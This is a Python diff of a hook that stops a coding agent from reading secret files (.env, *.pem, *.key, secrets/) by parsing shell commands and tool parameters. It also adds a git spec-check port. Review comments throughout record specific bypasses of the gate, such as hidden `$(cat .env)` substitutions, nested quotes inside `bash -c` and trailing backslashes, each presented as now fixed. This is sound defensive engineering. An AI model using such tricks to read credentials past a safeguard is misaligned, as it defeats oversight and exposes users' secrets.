+            # drop the following lines' substitutions (the fail-open direction).
+            # `#` mid-word is literal (`echo a#b`), and a word survives an
+            # ESCAPED blank (`echo a\\ #b` is the single word `a #b`), which is
+            # why word-start is carried as state and not read off seg[i - 1].
+            # [B5 review] PARAMETER EXPANSION. A blank inside `${...}` does not
+            # end a word and `#` there is data - `echo ${FOO:-a #b} END` prints
+            # `a #b END`. Reading that space as a word start invented a comment
+            # and dropped the line: `echo ${x:- #} "$(pip install evil)"` ran
+            # while both substrates allowed. Depth is CARRIED, not used to skip
+            # the region, because `${x:-"$(cat .env)"}` is live and must still
+            # be lifted. Shell parity: `_bd` in _cs_subst_scan.
+            if ch == "$" and i + 1 < n and seg[i + 1] == "{":
+                bd += 1
+                i += 2
+                wstart = False
+                continue
+            if ch == "}":
+                if bd:
+                    bd -= 1
+                i += 1
+                wstart = False
+                continue
+            if ch == "#" and wstart and not heredoc and not bd:
+                nl = seg.find("\\n", i)
+                if nl < 0:
+                    break
+                i = nl + 1
+                wstart = True
+                continue
+            if ch in ("'", '"'):
+                quote = ch
+                wstart = False
+            # [B5 review] `(` and `)` are NOT in this set, and the shell twin's
+            # is spelled the same way. Every member here terminates a word
+            # unconditionally; `)` does not - the one closing `$(...)`,
+            # `$((...))` or `<(...)` belongs to the current word, so
+            # `echo $(true)#"$(cat .env)"` really does read the secret. Calling
+            # it a word start invented a comment and dropped the rest of the
+            # line on both substrates. Over-lifting is the fail-closed side.
+            elif ch in " \\t\\n;&|":
+                wstart = True
+            else:
+                wstart = False
+            i += 1
+            continue
+        # inside "...": a ' is a literal char, but $( and ` are still active
+        wstart = False
+        if ch == '"':
+            quote = None
+            i += 1
+            continue
+        if ch == "$" and i + 1 < n and seg[i + 1] == "(":
+            # Balance to the matching `)`, but QUOTE-AWARE: a `)` inside a
+            # quoted run does not close the substitution (bash: `$(printf ')';
+            # cat .env)` runs `cat .env`). Single quotes suppress escapes; a `(`
+            # or `)` inside double quotes is a literal, and a nested `$(...)`
+            # there balances to itself (its parens cancel) and is re-lifted by
+            # the recursion. Missing this was a live fail-open a quoted `)`
+            # reached.
+            depth, j, start, q = 1, i + 2, i + 2, None
+            while j < n and depth:
+                c = seg[j]
+                if q == "'":
+                    if c == "'":
+                        q = None
+                    j += 1
+                    continue
+                if c == "\\\\" and j + 1 < n:
+                    j += 2
+                    continue
+                if q == '"':
+                    if c == '"':
+                        q = None
+                    j += 1
+                    continue
+                if c == "'" or c == '"':
+                    q = c
+                elif c == "(":
+                    depth += 1
+                elif c == ")":
+                    depth -= 1
+                    if depth == 0:
+                        break
+                j += 1
+            out.append(seg[start:j])
+            i = j + 1
+            continue
+        if ch == "`":
+            j = start = i + 1
+            while j < n and seg[j] != "`":
+                if seg[j] == "\\\\" and j + 1 < n:
+                    j += 2
+                    continue
+                j += 1
+            out.append(seg[start:j])
+            i = j + 1
+            continue
+        i += 1
+    return out
+
+
+def _lift_subs(cmd, ops=_SECRETS_OPS, _depth=0):
+    """The segments of `cmd`, PLUS the segments of every command line lifted
+    from a double-quoted substitution inside it, recursively.
+
+    [item 1] The substitution walk MUST run on the RAW command, before
+    _shell_segments. _shell_segments is quote-aware but NOT substitution-aware,
+    so it tears at the inner `"` of a substitution whose body re-opens a quote:
+    `echo "$(echo ")" ; cat .env)"` splits at that `"`, and the `; cat .env`
+    tail lands in a segment a per-segment subst walk never reaches - a live
+    fail-open that denied on the shell (which runs _cs_subst_scan on the raw
+    command) but ALLOWED here. Lifting from the raw command first restores
+    parity. Depth-bounded like the invoker recursion; the per-segment subst arm
+    in _segment_candidates / _expand_invoker_args still composes subst extraction
+    with invoker expansion (a sub inside a single-quoted `-c` argument)."""
+    segs = list(_shell_segments(cmd, ops))
+    if _depth < _EXPAND_DEPTH:
+        for inner in _subst_inners(cmd):
+            if inner.strip():
+                segs += _lift_subs(inner, ops, _depth + 1)
+    return segs
+
+
+def _bash_candidates(cmd):
+    # [lens A F1 / lens B finding 4] Tokenize the way the SHELL does: split
+    # on UNQUOTED whitespace only, joining adjacent quoted and unquoted runs
+    # into one token. A quoted argument is then ONE candidate (the words
+    # inside a commit message are not paths), while `cat ".env"` still
+    # yields `.env` and `cat .en''v` reassembles to `.env`. shlex.split in
+    # POSIX mode is exactly that tokenizer, including backslash escapes and
+    # multi-line input - the shell gate's hand-rolled equivalent exists only
+    # because bash has no shlex.
+    out = []
+    for _seg in _lift_subs(cmd):
+        out.extend(_segment_candidates(_seg))
+    return out
+
+
+def _segment_candidates(cmd, _depth=0):
+    # One SEGMENT - operators and unquoted newlines already removed, so
+    # every token here belongs to the same command and the first one is at
+    # command position.
+    #
+    # [batch 30-33, issue #31] EVERY TOKEN IS A CANDIDATE. This function used
+    # to filter its output through `_drop_excluded_globs`, the X-31
+    # negated-glob exemption; that is removed, together with the `noexcl`
+    # parameter that carried its two command-scoped vetoes. `rg -g '!*.pem'
+    # TODO` denies again, exactly as at 2.6.1, and the refusal message names
+    # the positive-scope workaround.
+    try:
+        toks = shlex.split(cmd, posix=True)
+    except ValueError:
+        # Unbalanced quote. shlex refuses; the shell gate takes the rest of
+        # the line as the quoted run. Fall back to a whitespace split rather
+        # than returning nothing - a parse failure must not become an allow.
+        #
+        # [round-2 review] ...which is exactly what it DID become. A bare split
+        # leaves the quote glued to the token, so `cat "secrets/prod.yaml`
+        # yielded `"secrets/prod.yaml`, matched no pattern, and this
+        # substrate ALLOWED what the shell blocked - the direction the
+        # module's own binding rule forbids, in the fallback whose comment
+        # promises the opposite. Emit the quote-stripped form as well; on a
+        # parse failure the deny-list bias has to be over-match.
+        #
+        # [round-4 P4, finding 13] ...and it emitted only the QUOTE-stripped
+        # twin. The emitted shell hook also emits a BACKSLASH-stripped twin
+        # (_sg_push's `case "$_CUR" in *\\\\*)` arm), and this fallback is
+        # exactly where shlex sends a trailing backslash - so the twin rule
+        # was transcribed to one substrate only. The protected-extension
+        # patterns are END-ANCHORED globs (`*.pem`, `*.key`), so one
+        # end-glued backslash defeated them HERE while the shell denied:
+        # `cat 'important.pem'\\` and `cp tls.key\\`, a live secret
+        # in the SDK-more-permissive direction. `.env` and `secrets/` are
+        # substring/prefix matched and were never affected, which is what
+        # made the gap look narrow.
+        #
+        # THREE twins, not two: quote-stripped, backslash-stripped, and BOTH
+        # - `cat '!important.pem'\\` needs the combination and neither
+        # strip reaches it. Additive and deduplicated, so the raw token stays
+        # a candidate (deny-list bias is over-match).
+        toks = []
+        for raw in cmd.split():
+            toks.append(raw)
+            stripped = raw.replace('"', "").replace("'", "")
+            _seen = [raw]
+            for _tw in (stripped,
+                        raw.replace(chr(92), ""),
+                        stripped.replace(chr(92), "")):
+                if _tw and _tw not in _seen:
+                    _seen.append(_tw)
+                    toks.append(_tw)
+        # The fallback path did NOT go through _shell_segments' quote
+        # tracking, so its tokens can still carry operators; those are the
+        # only ones _SH_OPS is applied to now.
+        toks = [p for raw in toks for p in _SH_OPS.split(raw) if p]
+    out = list(toks)
+    for tok in toks:
+        m = _ASSIGN.match(tok)
+        if m and m.group(1):
+            # `F=.env; cat $F` hides the path behind an expansion this gate
+            # cannot perform, but the ASSIGNMENT is in plain sight.
+            out.append(m.group(1))
+    # [item 1] A `$(...)`/backtick inside double quotes is a command line bash
+    # executes, so a secret read hidden in `echo "$(cat .env)"` is at a command
+    # position the token scan above never reaches. Lift each and re-parse it as
+    # its own segment(s); the recursion re-applies the invoker rule, so
+    # `echo "$(sh -c 'cat .env')"` resolves too. Depth-bounded like the invoker
+    # arm below. Shell parity: _cs_subst_scan feeding _sg_pass's _SG_EXTRA.
+    if _depth < _EXPAND_DEPTH:
+        for _inner in _subst_inners(cmd):
+            if _inner.strip():
+                for _iseg in _shell_segments(_inner):
+                    out.extend(_segment_candidates(_iseg, _depth + 1))
+    # [round-4 D8] ONE head scan, shared with _expand_invoker_args. This
+    # function used to carry its own - a separate `saw_prefix`/`skipped < 3`
+    # copy - which is why fixing the OTHER one changed nothing for this gate.
+    idx = _invoker_at(toks)
+    if idx is None:
+        return out
+    # [round-4 D8] RE-PARSE, do not re-tokenize. `tok.split()` is a whitespace
+    # split, not a shell parse, so a nested quote stayed glued to the word and
+    # one extra pair of quotes bypassed the gate this module repeatedly calls
+    # the one with no override path:
+    #
+    #     bash -c "cat secrets/prod.yaml"      deny
+    #     bash -c "cat 'secrets/prod.yaml'"    ALLOW   <-- reads the file
+    #     sh   -c "cat '.env'"                 ALLOW
+    #     eval    "cat '.env'"                 ALLOW
+    #
+    # Backlog J-15 recorded this as an over-match "in the cheap direction",
+    # which is inverted: executed, J-15's own example allows. Recursing
+    # through the real parser fixes it and subsumes the multi-line case that
+    # `read -ra` broke on the shell side.
+    #
+    # Depth 2, re-applying the invoker test at each level - NOT "expand every
+    # quoted run", which would make prose in a commit message a command line.
+    for tok in toks[idx + 1:]:
+        if not any(c.isspace() for c in tok):
+            continue
+        if _depth < _EXPAND_DEPTH:
+            for inner in _lift_subs(tok):
+                out.extend(_segment_candidates(inner, _depth + 1))
+        else:
+            out.extend(w for w in tok.split() if w)
+    return out
+
+
+def _secrets_gate(config):
+    # Precompute the normalized pattern once (config-constant) rather than
+    # per PreToolUse event - this is the hottest matcher in a session.
+    patterns = [(p, _norm_pat(p))
+                for p in config["secrets"]["never_read_paths"] if p]
+
+    async def secrets_gate(input_data, tool_use_id, context):
+        # Hard-block never-read paths. Blocks mid-plan by design (secret
+        # exposure is catastrophic). Deny-list bias: over-match, never
+        # under-match (shell T-1 semantics) - each pattern is tried
+        # as-given AND with an implicit leading '*', case-insensitively,
+        # against both basename and full path.
+        # [upstream P0-2/P2-4] Every tool surface that can reach a file,
+        # not just file_path. NotebookEdit supplies notebook_path and was
+        # already matched by the old matcher substring while the path key
+        # went unread - the gate reported success while checking nothing.
+        # [lens A F7] ...and the Bash surface, which this module never
+        # received. settings.json wired the shell gate to BOTH `Bash` and
+        # the file matchers; _GATE_MATCHERS carried only the second, so
+        # under `gate_substrate: "sdk-callable"` `cat .env`,
+        # `grep -r . secrets/` and `cat deploy.pem` were entirely unguarded.
+        # That is the original P0-2 finding, unfixed on this substrate,
+        # while the table above claimed the two wirings were in sync.
+        ti = _tool_input(input_data)
+        # Structured path parameters and Bash-derived tokens are judged
+        # apart: `dir_ok` says whether a bare directory NAME counts as
+        # naming the directory, and that is true of a `path` parameter and
+        # not of a word in a shell command. See _match_secret. Shell parity
+        # (the gate's two-phase $_dir_ok loop).
+        path_targets = [ti.get(k) or ""
+                        for k in ("file_path", "notebook_path", "path")]
+        path_targets = [t for t in path_targets if t]
+        # [round-2 review F-788] `pattern` is a SEARCH REGEX, not a path, and
+        # it used to sit in the dir_ok=True group - so the bare-directory-stem
+        # arm hard-blocked `Grep{pattern:"secrets"}`, i.e. searching your own
+        # codebase for the word "secrets" was impossible on a default
+        # install, in the gate whose own comment says it has no override
+        # path. It still has to be MATCHED (`Grep{pattern:"*.pem"}` reads
+        # matching file contents), so it moves to dir_ok=False rather than
+        # being dropped. Shell parity (PAT_CANDIDATES).
+        # [round-4 D19] `glob` was inspected by NEITHER substrate, and
+        # `Grep{pattern:"KEY", glob:"*.pem", output_mode:"content"}` returns
+        # the matching file CONTENTS. Lens A's F6 finding re-entering through
+        # a SIBLING PARAMETER: `path` was fixed, `pattern` was fixed, and
+        # `glob` - which selects the same files - was never listed. It joins
+        # the PATTERN group, not the path group: it is a selector, so a bare
+        # directory name in it must not count as naming the directory, which
+        # is the same call F-788 made for `pattern`. Shell parity; the full
+        # per-parameter enumeration is written out beside the shell twin.
+        # [batch 30-33, issue #31] NO '!'-STRIP HERE. A `!`-leading glob was
+        # briefly dropped from candidacy - the structured-payload half of the
+        # X-31 exemption - and it is gone with the rest of it. Shell parity
+        # (the shell gate's arm was removed in the same stroke).
+        _glob = ti.get("glob") or ""
+        pat_targets = [t for t in [ti.get("pattern") or "", _glob] if t]
+        # [batch 30-33 close pass] BOTH SPELLINGS. This gate holds the one
+        # ALLOW list in the secrets model - the dotenv-TEMPLATE carve-out
+        # below - and lib/cmdpos.py's "THE FOLD IS DENY-ONLY" forbids deciding
+        # it on a folded candidate alone: `cat .env.example$''` folds to the
+        # exact template name and was ALLOWED here while a pristine 2.6.1
+        # install denies it, together with 23 more decorated template
+        # spellings. The unfolded pass feeds this walk exactly the string
+        # 2.6.1 fed it, so its candidates are 2.6.1's candidates and the union
+        # can only DENY more. Empty second spelling = the fold was a no-op =
+        # one walk, which is the common case. Shell parity (`_sg_pass`, called
+        # once per spelling).
+        cmd_targets = []
+        for _spelling in _cmd_spellings(input_data):
+            if _spelling:
+                cmd_targets.extend(_bash_candidates(_spelling))
+        if not path_targets and not pat_targets and not cmd_targets:
+            return {}
+        for targets, dir_ok in ((path_targets, True), (pat_targets, False),
+                                (cmd_targets, False)):
+            for target in targets:
+                # [round-2 review F-947] The dotenv exemption is scoped to
+                # the DOTFILE pattern family it exists to soften. It used to
+                # `continue` here, skipping every pattern including the
+                # `secrets/**` that must not be overridden, so
+                # `secrets/.env.example` was unguarded. _match_secret applies
+                # it per-pattern now. Shell parity ($_dotenv_tmpl).
+                # [round-4, corpus QOT-23] The basename is stripped of quote
+                # characters before the dotenv-template test. On an UNBALANCED
+                # quote shlex refuses, the fallback emits the raw token, and
+                # `cat '.env.example` reached here as `'.env.example` - which
+                # matches the `.env*` family but is not an exact template
+                # basename, so this substrate DENIED a file whose entire
+                # purpose is to be read while the shell allowed it. The
+                # shell's tokenizer drops quotes, so this is parity, and it is
+                # in the false-positive direction: a deliberately exempted
+                # file, blocked by the gate with no override path.
+                _b = os.path.basename(target).strip("\\"'").lower()
+                deny = _match_secret(target, patterns, dir_ok,
+                                     _b in _DOTENV_TEMPLATES)
+                if deny:
+                    return deny
+        return {}
+
+    return secrets_gate
+
+
+def _match_secret(target, patterns, dir_ok=True, dotenv_tmpl=False):
+    # [upstream P2-4] Mirrors the shell's three-form matching exactly.
+    # '*.pem'-style patterns keep the implicit leading '*' (free). The
+    # '.env*' dotenv family is matched on a DOT-SEGMENT boundary so
+    # config.env / prod.env still block (shell T-1) while my.envelope.gleam
+    # and dev.environment.md no longer false-block mid-plan. Everything else
+    # ('secrets/*') is path-segment anchored.
+    base = os.path.basename(target).lower()
+    full = target.lower()
+    for pat, cpat in patterns:
+        stem = cpat[:-1] if cpat.endswith("*") else cpat
+        # [lens A F6, both substrates] 'secrets/**' normalizes to 'secrets/*',
+        # which the anchored form matched only WITH the slash present, so
+        # Grep{"path": "secrets"} allowed - and a Grep whose path is the
+        # directory returns the matching file CONTENTS. Naming the directory
+        # reaches everything under it. Empty for non-directory patterns.
+        # [round-2 review] Gated on dir_ok: applied to every candidate it made
+        # `grep secrets README.md` and `git commit -m secrets` block, which
+        # is lens B finding 4's failure mode reintroduced. Shell parity.
+        dstem = cpat[:-2] if (dir_ok and cpat.endswith("/*")) else ""
+        # [F-947] The dotenv-template exemption is per-PATTERN and applies to
+        # the dotfile family only. A template that also lives under a
+        # never-read DIRECTORY is a secret by location, and `secrets/**`
+        # decides that, not its basename.
+        if dotenv_tmpl and cpat.startswith("."):
+            continue
+        if cpat.startswith("*"):
+            hit = (fnmatch.fnmatchcase(base, cpat)
+                   or fnmatch.fnmatchcase(base, "*" + cpat)
+                   or fnmatch.fnmatchcase(full, cpat)
+                   or fnmatch.fnmatchcase(full, "*/" + cpat)
+                   or fnmatch.fnmatchcase(full, "*" + cpat))
+        elif cpat.startswith("."):
+            hit = (fnmatch.fnmatchcase(base, cpat)
+                   or fnmatch.fnmatchcase(base, "*" + stem)
+                   or fnmatch.fnmatchcase(base, "*" + stem + ".*")
+                   or fnmatch.fnmatchcase(full, cpat)
+                   or fnmatch.fnmatchcase(full, "*/" + cpat))
+        else:
+            hit = (fnmatch.fnmatchcase(base, cpat)
+                   or fnmatch.fnmatchcase(full, cpat)
+                   or fnmatch.fnmatchcase(full, "*/" + cpat)
+                   or bool(dstem) and (fnmatch.fnmatchcase(base, dstem)
+                                       or fnmatch.fnmatchcase(full, dstem)
+                                       or fnmatch.fnmatchcase(
+                                           full, "*/" + dstem)))
+        if hit:
+            # [batch 30-33, issue #31] THE REFUSAL NAMES THE WAY OUT, and the
+            # `BLOCKED: <candidate> matches never-read pattern <pattern>`
+            # prefix is byte-identical to what it always was so log parsing
+            # does not move. Shell parity: lib/templates.py `_sg_refuse`
+            # emits the same sentence.
+            #
+            # #31's complaint is that the text "does not hint at" the
+            # workaround the issue itself names. The hint covers both shapes
+            # this gate refuses: for a read the first sentence is the whole
+            # answer (the gate matched a PATH, and no negation unnames it),
+            # and for a search it names the positive scope, which excludes
+            # protected paths structurally rather than by a negation this
+            # gate would have to parse.
+            return _deny(f"BLOCKED: {target} matches never-read "
+                         f"pattern {pat}. This gate matches the PATH you "
+                         f"named, not your intent - a negated glob "
+                         f"(-g '!*.pem') still names it. To search while "
+                         f"excluding secrets, scope POSITIVELY: "
+                         f"rg -g '*.md' TODO")
+    return {}
+
+
+# [upstream P1-2, lens B finding 8] Enforcement is scoped to IMPLEMENTATION
+# paths, so the bootstrap commit of .claude/ itself passes.
+# [WP3 / D2] The prefixes are config now (hooks.spec_gate_commit_prefixes,
+# carried in RESOLVED_CONFIG); this tuple is only the default, the same one
+# lib/templates.SPEC_GATE_DEFAULT_PREFIXES renders into
+# .claude/githooks/spec-check.sh.
+_ENFORCED_PREFIXES = ("src/", "lib/", "app/", "test/", "tests/")
+_SPEC_CAND_CAP = 8
+_SPEC_CTRL = {c: "?" for c in range(32)}
+_SPEC_FALLBACK_NOTE = (
+    "(spec-gate-commit, the PreToolUse fallback: the git pre-commit hook "
+    "that runs this check on the real staged set is not installed in this "
+    "clone, so files staged by this same command are not seen. Re-run "
+    "bootstrap-install to add it.)")
+# [WP3 fix1, operator decision 2026-10-06 (2)] The note for a project below
+# the repository top, where a re-install adds no git hook.
+_SPEC_FALLBACK_NOTE_BELOW = (
+    "(spec-gate-commit, the PreToolUse fallback: this project is below the "
+    "repository's top level, where no git pre-commit hook runs this check "
+    "on the real staged set, so files staged by this same command are not "
+    "seen.)")
+
+
+def _spec_is_task_or_index(p):
+    """.claude/specs/INDEX.md, or a task file .claude/specs/<slug>/tasks/
+    <file> (no dot-named slug or file), as spec-check.sh's case arms."""
+    if p == ".claude/specs/INDEX.md":
+        return True
+    if not p.startswith(".claude/specs/"):
+        return False
+    parts = p[len(".claude/specs/"):].split("/")
+    return (len(parts) == 3 and parts[1] == "tasks" and bool(parts[0])
+            and not parts[0].startswith(".") and bool(parts[2])
+            and not parts[2].startswith("."))
+
+
+def _spec_parse_task(text):
+    """[WP3 / D2] One task file -> (status, has_files_block, entries): the
+    records spec-check.sh's awk program prints, in the same order."""
+    status, hasb, ents = "", False, []
+    fm, inb = 0, False
+    for ln, raw in enumerate(text.split("\\n"), 1):
+        line = raw.rstrip(" \\t\\r")
+        if ln == 1 and line == "---":
+            fm = 1
+            continue
+        if fm == 1:
+            if line in ("---", "..."):
+                fm = 2
+            elif line.startswith("status:"):
+                v = line[len("status:"):].lstrip(" \\t")
+                status = v.replace('"', "").replace("'", "").lower()
+            continue
+        if inb:
+            if line[:2] == "- ":
+                e = line[2:].lstrip(" \\t")
+                if e:
+                    ents.append(e)
+                continue
+            inb = False
+        if line == "Files:":
+            inb, hasb = True, True
+    return status, hasb, ents
+
+
+async def _spec_pre_commit_hook(proj):
+    """The pre-commit file where git will look for it (--git-path hooks),
+    or None when git cannot say."""
+    try:
+        rc, out, _ = await _run(["git", "rev-parse", "--git-path", "hooks"],
+                                cwd=proj, shell=False)
+    except OSError:
+        return None
+    hd = out.strip()
+    if rc != 0 or not hd:
+        return None
+    pc = Path(hd) if os.path.isabs(hd) else proj / hd
+    return pc / "pre-commit"
+
+
+async def _spec_git_hook_installed(proj):
+    """[WP3 / D2] Is the git pre-commit shim (the check on the REAL staged
+    set) installed where git will run it? Same test as spec-gate-commit.sh.
+    [WP3 fix2 IT-1, IT-2, IT-5, MR-4, RG-2] Only bootstrap-install's own
+    shim, byte for byte (_SPEC_SHIM_SHA256), executable, and only at the
+    repository top: the shim runs the top's check, never a package's below
+    it. A hook that merely held the text .claude/githooks/dispatch
+    pre-commit was deferred to, and the check then ran nowhere."""
+    rc, out, _ = await _spec_git(proj, "rev-parse", "--show-prefix")
+    if rc != 0 or _spec_line(out):
+        return False
+    pc = await _spec_pre_commit_hook(proj)
+    if pc is None:
+        return False
+    try:
+        if not (pc.is_file() and os.access(pc, os.X_OK)):
+            return False
+        data = pc.read_bytes()
+    except OSError:
+        return False
+    return hashlib.sha256(data).hexdigest() == _SPEC_SHIM_SHA256
+
+
+async def _spec_fallback_note(proj):
+    """[WP3 fix1 INST-3] The fallback's note, as spec-gate-commit.sh picks
+    it: a pre-commit hook in place that is not bootstrap-install's shim
+    ([WP3 fix2 IT-2] or is not executable), else core.hooksPath set
+    ([WP3 fix3 HD-5] or set to an empty value, which turns hooks off), else
+    the hook is missing and a re-install adds it. (Below the top the
+    caller overrides it.)"""
+    pc = await _spec_pre_commit_hook(proj)
+    if pc is not None and pc.exists():
+        return (_SPEC_FALLBACK_NOTE_FOREIGN if os.access(pc, os.X_OK)
+                else _SPEC_FALLBACK_NOTE_NOEXEC)
+    try:
+        rc, out, _ = await _run(["git", "config", "--get", "core.hooksPath"],
+                                cwd=proj, shell=False)
+    except OSError:
+        rc, out = 1, ""
+    if rc == 0 and out.rstrip("\\n"):
+        return _SPEC_FALLBACK_NOTE_HOOKS_PATH
+    if rc == 0:
+        return _SPEC_FALLBACK_NOTE_HOOKS_OFF
+    return _SPEC_FALLBACK_NOTE
+
+
+async def _spec_git(cwd, *args, inp=None):
+    """[WP3 fix1 SDKP-1] git with bytes in and out, as spec-check.sh reads
+    git. Names go through os.fsdecode (surrogateescape), so a name that is
+    not UTF-8 goes back to git as the same bytes; with _run's
+    errors="replace" such a task file could not be read. Returns (rc,
+    stdout bytes, stderr text)."""
+    try:
+        proc = await asyncio.create_subprocess_exec(
+            "git", *args, cwd=str(cwd),
+            stdin=(asyncio.subprocess.PIPE if inp is not None
+                   else asyncio.subprocess.DEVNULL),
+            stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
+        out, err = await proc.communicate(inp)
+    except OSError as exc:
+        return 127, b"", str(exc)
+    return proc.returncode, out or b"", (err or b"").decode(errors="replace")
+
+
+def _spec_names(out):
+    """A -z name list from git -> names."""
+    return [os.fsdecode(n) for n in out.split(b"\\0") if n]
+
+
+def _spec_line(out):
+    """One line of git output, its newline dropped, as a name."""
+    return os.fsdecode(out[:-1] if out.endswith(b"\\n") else out)
+
+
+def _spec_err(err):
+    """spec-check.sh's _err: the stderr, trailing newlines dropped, cut at
+    300 (SDKP-5: the cut kept git's newline, so the texts differed)."""
+    return err.rstrip("\\n")[:300]
+
+
+def _spec_disp(p):
+    """A name as spec-check.sh prints it: control characters as "?", and
+    bytes that are not UTF-8 as U+FFFD (a message must be valid text)."""
+    return (p.encode("utf-8", "surrogateescape").decode("utf-8", "replace")
+            .translate(_SPEC_CTRL))
+
+
+async def _spec_gitv(top, major, minor):
+    """[WP3 fix2 MR-1] spec-check.sh's _gitv: this git is MAJOR.MINOR or
+    later, read from `git version` as the shell reads it."""
+    rc, out, _ = await _spec_git(top, "version")
+    v = out.decode("utf-8", "replace").rstrip("\\n") if rc == 0 else ""
+    if v.startswith("git version "):
+        v = v[len("git version "):]
+    j = v.split(".", 1)[0]
+    v = v.split(".", 1)[1] if "." in v else v
+    n = v.split(".", 1)[0]
+    if not (re.fullmatch("[0-9]{1,4}", j) and re.fullmatch("[0-9]{1,4}", n)):
+        return False
+    return int(j) > major or (int(j) == major and int(n) >= minor)
+
+
+async def _spec_check(proj, prefixes, changed=None, task="", mode=None):
+    """[WP3 / D2] Port of .claude/githooks/spec-check.sh (the canonical copy).
+    Returns (rc, message, missing): rc 0 = every enforced path is covered,
+    2 = some is not (message names the task file to edit), 3 = the check
+    could not run. `changed` None reads the staged set; a given `changed`
+    holds paths from the project directory, as --files does. `mode` is the
+    caller's hooks.spec_gate_commit_mode (the shell reads it from
+    BOOTSTRAP_SPEC_MODE, as it does here when `mode` is None).
+
+    [WP3 fix1] As the shell check: a project below the repository top is
+    checked on its own paths and its own .claude/specs (operator decision
+    2026-10-06 (2)); a commit that concludes a merge on the merge's own
+    changes (decision (1)); task files read through one checkout-index
+    (SDKP-1: filters, encodings, gitlinks and names that are not UTF-8 read
+    as the shell reads them); the remedy follows the commit's form.
+    [WP3 fix2] The merge's own changes are judged against git's automatic
+    merge result (MR-1); a stopped cherry-pick or revert likewise (MR-2);
+    unmerged task files do not count (MR-5); below the top, a mention of
+    the path from the repository top covers too (MR-7). [WP3 fix3] Also a
+    merge of unrelated histories (MR2-1), and a commit made while a rebase
+    or `git am` is stopped (MR2-3); the whole change has its own reason on
+    any git (MR2-4)."""
+    if mode is None:
+        mode = os.environ.get("BOOTSTRAP_SPEC_MODE", "")
+    rc, out, _ = await _spec_git(proj, "rev-parse", "--show-toplevel")
+    if rc != 0:
+        return 3, "spec check: not inside a git work tree", []
+    top = _spec_line(out)
+    rc, out, _ = await _spec_git(proj, "rev-parse", "--show-prefix")
+    pfx = _spec_line(out) if rc == 0 else ""
+
+    async def git(*args, inp=None):
+        return await _spec_git(top, *args, inp=inp)
+
+    async def git_path(name, exists=os.path.isfile):
+        rc, out, _ = await git("rev-parse", "--git-path", name)
+        f = _spec_line(out) if rc == 0 else ""
+        if f and not os.path.isabs(f):
+            f = os.path.join(top, f)
+        return f if f and exists(f) else ""
+
+    async def seq_ref(name):
+        # [WP3 fix5 R4-1, CRIT7-1; fix6 RV5-SC-1; fix7 CRIT6-1]
+        # spec-check.sh's _seqref: never by name lookup (a branch or tag so
+        # named resolves too), and the read follows the backend, as git's
+        # does. A reftable repository (the heads live in its ref store) is
+        # asked for that exact ref with show-ref --verify, and any file
+        # there is ignored, as git ignores it; otherwise the file at
+        # --git-path is read itself and is a stop when it names a commit.
+        rc, out, _ = await git("rev-parse", "--show-ref-format")
+        if rc == 0 and _spec_line(out) == "reftable":
+            rc, out, _ = await git("show-ref", "--verify", name)
+            return _spec_line(out).split(" ", 1)[0] if rc == 0 else ""
+        f = await git_path(name)
+        if f:
+            try:
+                with open(f, "rb") as fh:
+                    ln = os.fsdecode(fh.read().split(b"\\n", 1)[0])
+            except OSError:
+                ln = ""
+            if ln.startswith("ref: refs/"):
+                ln = ln[len("ref: "):]
+            elif not ln or re.search("[^0-9a-f]", ln):
+                return ""
+            rc, out, _ = await git("rev-parse", "-q", "--verify",
+                                   ln + "^{commit}")
+            return _spec_line(out) if rc == 0 else ""
+        return ""
+
+    mpar, seq, rule, pick = [], "", "", ""
+    if changed is None:
+        rc, out, err = await git("diff", "--cached", "--name-only", "-z",
+                                 "--no-renames")
+        if rc != 0:
+            return 3, "spec check: git diff --cached failed: " + _spec_err(err), []
+        raw = _spec_names(out)
+        # A merge: MERGE_HEAD, or inside pre-merge-commit GITHEAD_<oid>.
+        mh = await git_path("MERGE_HEAD")
+        if mh:
+            try:
+                with open(mh, "rb") as fh:
+                    mpar = [os.fsdecode(o) for o in fh.read().split(b"\\n")
+                            if o]
+            except OSError:
+                mpar = []
+        elif os.environ.get("BOOTSTRAP_GIT_HOOK") == "pre-merge-commit":
+            mpar = [k[len("GITHEAD_"):] for k in os.environ
+                    if k.startswith("GITHEAD_")]
+        if mpar:
+            seq = "merge"
+        else:
+            # [WP3 fix2 MR-2] A cherry-pick or revert stopped on conflicts.
+            for s_, name in (("pick", "CHERRY_PICK_HEAD"),
+                             ("revert", "REVERT_HEAD")):
+                pick = await seq_ref(name)
+                if pick:
+                    seq = s_
+                    break
+        if not seq:
+            # [WP3 fix3 MR2-3] A `git commit` made while a rebase or `git
+            # am` is stopped (spec-check.sh): a rebase that names its commit
+            # (REBASE_HEAD) is judged as a stopped pick; `git am` names none.
+            ra = await git_path("rebase-apply", os.path.isdir)
+            rm = await git_path("rebase-merge", os.path.isdir)
+            if ra and os.path.isfile(os.path.join(ra, "applying")):
+                seq = "am"
+            elif rm or ra:
+                seq = "rebase"
+                pick = await seq_ref("REBASE_HEAD")
+        if seq:
+            for o in (mpar if seq == "merge" else
+                      [] if seq in ("am", "rebase") and not pick else [pick]):
+                if not o or re.search("[^0-9a-f]", o):
+                    return 3, ("spec check: the %s's other commit '%s' is not "
+                               "an object name" % (seq, _spec_disp(o))), []
+            rule, mt = "parents", []
+            if seq == "merge":
+                if len(mpar) == 1 and await _spec_gitv(top, 2, 38):
+                    # [WP3 fix3 MR2-1] unrelated histories (an import).
+                    rule, mt = "auto", ["--allow-unrelated-histories",
+                                        "HEAD", mpar[0]]
+            else:
+                # [WP3 fix3 MR2-4] old: git before 2.40; whole: its commit
+                # is a merge or has no parent, or there is none (git am).
+                rule = "whole"
+                if pick and not await _spec_gitv(top, 2, 40):
+                    rule = "old"
+                elif pick:
+                    rc2, _o2, _ = await git("rev-parse", "-q", "--verify",
+                                            pick + "^2")
+                    rc1, out1, _ = await git("rev-parse", "-q", "--verify",
+                                             pick + "^1")
+                    if rc2 != 0 and rc1 == 0:
+                        pb = _spec_line(out1)
+                        rule = "auto"
+                        mt = (["--merge-base=" + pick, "HEAD", pb]
+                              if seq == "revert" else
+                              ["--merge-base=" + pb, "HEAD", pick])
+            if rule == "auto":
+                # A conflicted path, or one where the index differs from
+                # git's automatic result.
+                rc, out, err = await git("merge-tree", "--write-tree",
+                                         "--no-messages", "--name-only",
+                                         "-z", *mt)
+                if rc not in (0, 1):
+                    return 3, ("spec check: git merge-tree failed: "
+                               + _spec_err(err)), []
+                parts = out.split(b"\\0")
+                tree = parts[0].decode("ascii", "replace")
+                if not tree or re.search("[^0-9a-f]", tree):
